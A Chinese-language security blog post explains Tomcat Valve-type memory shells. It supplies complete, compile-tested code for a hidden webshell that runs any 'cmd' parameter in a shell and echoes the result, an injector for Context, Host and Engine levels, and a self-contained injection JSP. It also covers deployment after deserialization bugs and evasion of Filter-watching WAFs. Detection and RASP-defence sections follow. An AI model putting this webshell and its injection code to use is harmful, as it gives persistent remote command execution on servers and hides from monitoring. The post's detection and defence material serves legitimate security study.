---
title: Tomcat Valve 内存马
date: 2026-08-06
categories: 
- 漏洞分析
tags: 
- tomcat
- valve
- 内存马
- Java安全
---

# Valve 内存马

Valve 型内存马是 **Tomcat 特有**的内存马类型。它利用 Tomcat 的 Pipeline-Valve（管道-阀门）机制，把恶意 Valve 动态挂载到容器的管道上，拦截经过该容器的所有请求。

与 Filter / Servlet / Listener 三种基于 Servlet 规范的内存马相比，Valve 更底层、更隐蔽：
- **不属于 Servlet 规范**，很多安全产品只监控 Filter/Listener 的注册，不检查 Valve；
- **不需要任何 URL 映射**，请求进入容器（包括 404、静态资源）都会经过它；
- **回显不需要反射**，`invoke` 直接拿到内部 `connector.Request / Response`。

> 本文代码已用 Tomcat 9.0.100（javax）与 Tomcat 10.1.34（jakarta）真实编译验证。

**本质**：模拟 `Pipeline.addValve`，把恶意 `invoke` 代码 + "请求进入容器"组装进管道，比 Filter 更底层、无需 URL 映射。整体框架见 [《内存马原理总纲》]({% post_url 2025-12-26-内存马原理总纲 %})。

---

## 一、Tomcat Pipeline-Valve 架构

### 1.1 Valve 在请求处理中的位置

Tomcat 的请求处理采用**责任链**模式：四大容器 **Engine / Host / Context / Wrapper** 每个都持有一条 `Pipeline`，管道上挂着一串 `Valve`。请求按 Engine → Host → Context → Wrapper 逐层穿过各容器的 Valve 管道，最后由 Wrapper 的管道进入 Servlet。

```
HTTP 请求
    ↓
CoyoteAdapter.service()
    ↓
Engine  Pipeline   → StandardEngineValve（基础阀）
    ↓
Host    Pipeline   → StandardHostValve（基础阀）
    ↓
Context Pipeline   → StandardContextValve（基础阀）
    ↓
Wrapper Pipeline   → StandardWrapperValve（基础阀）
    ↓
ApplicationFilterChain → Filter 链 → Servlet
```

**关键点**：
- 每个容器即使不添加任何自定义 Valve，也至少有一个**基础阀**（basic）完成容器核心职责（调用子容器、调用 Servlet）。
- Valve 在 Filter 之前执行，且**不需要 URL 映射**——只要请求流经该容器就会触发。

### 1.2 核心类关系

```
Container（org.apache.catalina.Container）
├── getPipeline(): Pipeline        ← 容器的管道
├── getParent(): Container         ← 向上取父容器（Context→Host→Engine）
└── 实现类：
    ├── StandardEngine
    ├── StandardHost
    ├── StandardContext
    └── StandardWrapper

Pipeline（org.apache.catalina.Pipeline）
├── addValve(Valve)                ← 动态挂载（public，无需反射）
├── getValves(): Valve[]
├── getFirst(): Valve
└── removeValve(Valve)

Valve（org.apache.catalina.Valve）
└── invoke(Request, Response)      ← 拦截逻辑写在这里

ValveBase（org.apache.catalina.valves.ValveBase）
└── 抽象类，封装生命周期/MBean；继承后重写 invoke() 即可
```

### 1.3 Valve 与 Filter 的核心差异

| 对比维度 | Filter 内存马 | Valve 内存马 |
|---------|--------------|-------------|
| 是否 Servlet 规范 | ✅ 是 | ❌ 否（Tomcat 特有） |
| 触发层级 | Context（应用级） | Context / Host / Engine / Wrapper 任意层 |
| 是否需要 URL 映射 | 需要（如 `/*`） | 不需要 |
| 拿到的请求对象 | RequestFacade（门面） | 内部 connector.Request |
| 回显 | 需两步反射 | 直接 `response.getWriter()` |
| 注入步骤 | FilterDef/FilterMap/FilterConfig 多步 | 一行 `addValve()` |
| 隐蔽性 | 中 | **高** |

---

## 二、动态注册原理

### 2.1 Pipeline 是单向链表

Valve 通过 `getNext()` 串成链表，`invoke()` 里**必须**调用 `getNext().invoke(request, response)`，否则请求链中断（等价于 Filter 里忘记 `chain.doFilter()`）：

```
[Valve A] → [Valve B] → ... → [基础阀] → 下层容器 / Servlet
```

`StandardPipeline.addValve()` 会把新 Valve 挂到链上（插入在基础阀之前）。容器已启动时，运行时添加的 Valve 下一次请求即可生效。

### 2.2 动态注册步骤

```
1. 编写恶意 Valve 类（继承 ValveBase，重写 invoke）
2. 获取 StandardContext 对象（反射链，同 Filter 篇）
3. 调用 context.getPipeline().addValve(maliciousValve)
4. 可选：通过 context.getParent() 向上取 Host / Engine，注入更高层级
```

---

## 三、完整代码实现

### 3.1 恶意 Valve 类（javax / Tomcat 8.5 / 9.x）

```java
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.valves.ValveBase;

import javax.servlet.ServletException;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class ValveMemShell extends ValveBase {

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        // 注意：Valve 的 invoke 直接拿到的是内部 connector.Request / Response，
        // 取参数、回显都不需要反射（这是与 Filter/Listener 的重要区别）
        String cmd = request.getParameter("cmd");
        if (cmd != null && !cmd.isEmpty()) {
            try {
                String result = exec(cmd);
                response.setContentType("text/html;charset=UTF-8");
                response.getWriter().write("<pre>" + result + "</pre>");
                return; // 命令执行型：直接返回，不进入后续业务
            } catch (Exception e) {
                response.getWriter().write("Error: " + e.getMessage());
            }
        }
        // 正常请求继续沿管道传递（必须调用 getNext().invoke()，否则管道中断）
        getNext().invoke(request, response);
    }

    /**
     * 统一命令执行器（与 Filter / Servlet / Listener 三篇通用）
     */
    private static String exec(String cmd) throws Exception {
        String[] execCmd = System.getProperty("os.name").toLowerCase().contains("windows")
                ? new String[]{"cmd.exe", "/c", cmd}
                : new String[]{"/bin/sh", "-c", cmd};

        Process process = new ProcessBuilder(execCmd).redirectErrorStream(true).start();
        try (ByteArrayOutputStream out = new ByteArrayOutputStream();
             InputStream is = process.getInputStream()) {
            byte[] buf = new byte[4096];
            int len;
            while ((len = is.read(buf)) != -1) {
                out.write(buf, 0, len);
            }
            process.waitFor();
            return out.toString(System.getProperty("sun.jnu.encoding"));
        }
    }
}
```

### 3.2 注入器代码（javax）

```java
import org.apache.catalina.Valve;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.connector.Request;

import java.lang.reflect.Field;

public class ValveMemShellInjector {

    /**
     * 注入到当前 Context 的 Pipeline
     */
    public static void inject(StandardContext context) {
        // 防重复：遍历管道已有 Valve，判断是否已注入
        for (Valve valve : context.getPipeline().getValves()) {
            if (valve instanceof ValveMemShell) {
                System.out.println("[!] Valve already injected.");
                return;
            }
        }
        // addValve() 是 ContainerBase 的 public 方法，无需反射
        context.getPipeline().addValve(new ValveMemShell());
        System.out.println("[+] Valve memory shell injected.");
    }

    /**
     * 注入到 Host / Engine 级（影响范围更大，也更影响正常业务）
     */
    public static void injectUpper(StandardContext context) {
        // Host 级：该 Host 下所有应用的所有请求都经过
        org.apache.catalina.Host host = (org.apache.catalina.Host) context.getParent();
        host.getPipeline().addValve(new ValveMemShell());

        // Engine 级：整个 Tomcat 实例的所有请求都经过
        org.apache.catalina.Engine engine = (org.apache.catalina.Engine) host.getParent();
        engine.getPipeline().addValve(new ValveMemShell());
    }

    /**
     * 从 RequestFacade 反射获取 StandardContext（与 Filter / Servlet 篇相同链）
     */
    public static StandardContext getStandardContext(Object servletRequest) throws Exception {
        Field requestField = servletRequest.getClass().getDeclaredField("request");
        requestField.setAccessible(true);
        Request request = (Request) requestField.get(servletRequest);
        return (StandardContext) request.getContext();
    }
}
```

### 3.3 层级扩展：Context / Host / Engine

```java
// Context 级：只影响当前 Web 应用（推荐，误伤最小）
StandardContext context = ValveMemShellInjector.getStandardContext(request);
context.getPipeline().addValve(new ValveMemShell());

// Host 级：该 Host 下所有应用（context.getParent() → StandardHost）
org.apache.catalina.Host host = (org.apache.catalina.Host) context.getParent();
host.getPipeline().addValve(new ValveMemShell());

// Engine 级：整个 Tomcat 实例（host.getParent() → StandardEngine）
org.apache.catalina.Engine engine = (org.apache.catalina.Engine) host.getParent();
engine.getPipeline().addValve(new ValveMemShell());
```

层级越高影响面越大，隐蔽性也越高（不在任何应用的注册表里），但对正常业务的干扰也越大，需谨慎。

### 3.4 触发注入的 JSP（自包含，内联恶意 Valve）

为了让 JSP 单独即可完成注入（不依赖额外编译的类），这里把恶意 Valve 内联在 `<%! %>` 声明里：

```jsp
<%@ page import="java.io.*, org.apache.catalina.connector.*, org.apache.catalina.core.*" %>
<%!
    // 内联恶意 Valve：JSP 单独即可完成注入
    public class EvilValve extends org.apache.catalina.valves.ValveBase {
        @Override
        public void invoke(Request request, Response response)
                throws java.io.IOException, javax.servlet.ServletException {
            String cmd = request.getParameter("cmd");
            if (cmd != null && !cmd.isEmpty()) {
                try {
                    Process p = new ProcessBuilder("/bin/sh", "-c", cmd)
                            .redirectErrorStream(true).start();
                    ByteArrayOutputStream out = new ByteArrayOutputStream();
                    byte[] buf = new byte[4096];
                    int len;
                    InputStream is = p.getInputStream();
                    while ((len = is.read(buf)) != -1) out.write(buf, 0, len);
                    response.getWriter().write("<pre>" + out.toString("UTF-8") + "</pre>");
                    return;
                } catch (Exception e) {
                    response.getWriter().write("Error: " + e.getMessage());
                }
            }
            getNext().invoke(request, response);
        }
    }
%>
<%
    try {
        Field reqF = request.getClass().getDeclaredField("request");
        reqF.setAccessible(true);
        Request req = (Request) reqF.get(request);
        StandardContext context = (StandardContext) req.getContext();
        context.getPipeline().addValve(new EvilValve());
        out.println("Valve memory shell injected! 访问: ?cmd=whoami");
    } catch (Exception e) {
        out.println("Failed: " + e.getMessage());
    }
%>
```

### 3.5 jakarta（Tomcat 10+）版本差异

`org.apache.catalina` 包名在 Tomcat 10+ **没有改**，只有 Servlet 规范包从 `javax.servlet` 迁移到了 `jakarta.servlet`。因此 Valve 内存马仅需改一行：

```java
// javax（Tomcat 8.5 / 9.x）
import javax.servlet.ServletException;

// jakarta（Tomcat 10.x / 11.x）—— 只需替换这一处
import jakarta.servlet.ServletException;
```

注入器（`connector.Request`、`Pipeline`、`ValveBase` 等）两个版本完全一致。

---

## 四、代码详解

### 4.1 invoke 直接拿到内部 Request/Response —— 回显无需反射

Valve 的 `invoke(Request, Response)` 参数是**内部 `org.apache.catalina.connector.Request / Response`**，不是给业务代码用的门面对象。这意味着：

```java
// Filter/Listener 回显：RequestFacade → request 字段 → response 字段（两步反射）
Field reqField = servletRequest.getClass().getDeclaredField("request");
...
Field responseField = innerRequest.getClass().getDeclaredField("response");
...

// Valve 回显：直接写（connector.Response 实现了 HttpServletResponse）
response.getWriter().write("<pre>" + result + "</pre>");
```

`connector.Response` 直接实现了 `javax.servlet.http.HttpServletResponse`（javax 版）/ `jakarta.servlet.http.HttpServletResponse`（jakarta 版），`getWriter()` 可直接使用。

### 4.2 addValve 是 public 方法，无需反射

`ContainerBase.addValve(Valve)` 是 public 的，`StandardPipeline.addValve()` 也是 public 的。拿到 `StandardContext` 后一行即可完成注入，这是 Valve 型内存马**注入步骤最少**的原因（对比 Filter 需要 FilterDef / FilterMap / ApplicationFilterConfig 三步构造）。

### 4.3 防重复注入

```java
for (Valve valve : context.getPipeline().getValves()) {
    if (valve instanceof ValveMemShell) {
        return; // 已注入
    }
}
```

### 4.4 层级选择

| 层级 | 获取方式 | 影响范围 | 适用 |
|------|---------|---------|------|
| Wrapper | `context.getParent()`（某 Servlet 的 Wrapper） | 单个 Servlet | 极少用 |
| **Context** | `req.getContext()` | 当前应用 | 推荐，误伤最小 |
| Host | `context.getParent()` | Host 下所有应用 | 持久化 |
| Engine | `host.getParent()` | 整个 Tomcat | 隐蔽性最高 |

### 4.5 版本兼容性

| Tomcat 版本 | Servlet 包 | Valve 代码差异 |
|-------------|-----------|--------------|
| 8.5.x / 9.x | `javax.servlet` | `import javax.servlet.ServletException` |
| 10.x / 11.x | `jakarta.servlet` | `import jakarta.servlet.ServletException` |

- 容器内部 API（`org.apache.catalina.*`、`connector.Request/Response`、`ValveBase`）在 Tomcat 10+ **未改包名**，仅上述 import 差异。
- 本文代码已分别用 Tomcat 9.0.100 与 10.1.34 编译验证。

---

## 五、利用场景

### 5.1 反序列化 → Valve 注入

Shiro / Fastjson 反序列化拿到代码执行后，注入 Valve 实现持久化：

```java
// 反序列化 payload 中的代码片段
Field reqF = request.getClass().getDeclaredField("request");
reqF.setAccessible(true);
Request req = (Request) reqF.get(request);
StandardContext context = (StandardContext) req.getContext();
context.getPipeline().addValve(new EvilValve());
```

### 5.2 绕过 Filter 监控型 WAF

```
WAF / 安全产品监控：
  ✅ filterDefs / filterMaps 变化
  ✅ applicationEventListeners 变化
  ❌ Pipeline.addValve()（盲区）
```

### 5.3 Host / Engine 级持久化

注入到 Engine 层后，即使某个应用被重启、重新部署，Valve 仍留在容器管道上（只要 Tomcat 不重启）。这是 Valve 型相比应用级内存马在持久性上的优势。

---

## 六、检测方式

### 6.1 JMX 检查

ValveBase 实现了 `LifecycleMBeanBase`，每个 Valve 会注册 MBean：

```bash
jconsole → Catalina → type=Valve → 查看异常 Valve 类名
```

### 6.2 Arthas 在线排查

```bash
# 列出 StandardContext 管道上的所有 Valve
vmtool --action getInstances --className org.apache.catalina.core.StandardContext \
  --express 'instances[0].getPipeline().getValves()' --limit 10

# 搜索可疑 Valve 类（正常只有 Standard*Valve 等内置阀）
sc *.Valve*
```

### 6.3 内存 Dump 分析

```bash
jmap -dump:format=b,file=heapdump.hprof <pid>
# MAT 中搜索 ValveBase 子类，检查类名是否非 Tomcat 内置
```

### 6.4 基线对比脚本

```java
// 与部署基线对比：列出管道上的 Valve
public static void listValves(StandardContext ctx) {
    for (Valve v : ctx.getPipeline().getValves()) {
        System.out.println(v.getClass().getName());
    }
}
```

---

## 七、防御建议

| 层面 | 措施 | 说明 |
|------|------|------|
| **RASP** | Hook `Pipeline.addValve()` | 拦截运行时非启动阶段的 Valve 挂载 |
| **JVM Agent** | 监控 `StandardPipeline` 的 `addValve` 调用 | 记录调用栈来源 |
| **监控** | 定期对比 Pipeline 上的 Valve 基线 | 发现非内置 Valve |
| **事前** | 修复反序列化等 RCE 漏洞 | 切断注入入口 |

```java
// RASP Hook 示意（ByteBuddy @RuntimeType 教学写法）
@RuntimeType
public static void onAddValve(@This StandardPipeline pipeline, @Argument(0) Valve valve) {
    StackTraceElement[] stack = Thread.currentThread().getStackTrace();
    for (StackTraceElement frame : stack) {
        if (frame.getClassName().contains("ContextConfig")) {
            return; // 启动阶段放行
        }
    }
    // 运行时挂载 Valve → 告警
    alert("Detected runtime Valve injection: " + valve.getClass().getName());
    throw new SecurityException("Suspicious pipeline modification blocked");
}
```

> 说明：`@RuntimeType` / `@This` 为 ByteBuddy 注解，需要 `net.bytebuddy:byte-buddy` 依赖，此处为示意写法。

---

## 八、总结

Valve 型内存马是四种 Tomcat 内存马中**隐蔽性最高**的一种：

| 特性 | Filter | Servlet | Listener | **Valve** |
|------|--------|---------|----------|-----------|
| 注入难度 | ⭐⭐⭐ | ⭐⭐ | ⭐ | **⭐（最简单）** |
| 触发时机 | Filter 链 | Servlet 处理 | 请求到达 | **进入容器即触发** |
| 隐蔽性 | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | **⭐⭐⭐⭐⭐** |
| 是否需 URL 映射 | 是 | 是 | 否 | **否** |

**核心理由**：
1. `getPipeline().addValve()` 是 public 方法，无需反射，注入步骤最少
2. 不在 Servlet 规范内，安全产品监控覆盖最少
3. 不需要 URL 映射，任何请求都经过
4. 可注入 Host / Engine 层，影响面更大、更隐蔽

**攻击者偏好排序**（综合隐蔽性与功能）：
1. **Valve** — 最隐蔽、注入最简单
2. **Listener** — 隐蔽、触发早
3. **Filter** — 最灵活、覆盖面广
4. **Servlet** — 备选通道

> **延伸阅读**：[Tomcat Filter 内存马]({% post_url 2025-12-27-Tomcat_filter内存马的 %}) | [Tomcat Servlet 内存马]({% post_url 2025-12-27-Tomcat_servlet内存马 %}) | [Tomcat Listener 内存马]({% post_url 2025-12-27-Tomcat_ listener内存马 %}) | [Java Agent 内存马]({% post_url 2026-08-06-Java_Agent内存马 %}) | [Spring 容器内存马]({% post_url 2026-08-06-Spring_容器内存马 %}) | [WebSocket 等偏门内存马]({% post_url 2026-08-06-Tomcat_WebSocket等偏门内存马 %})
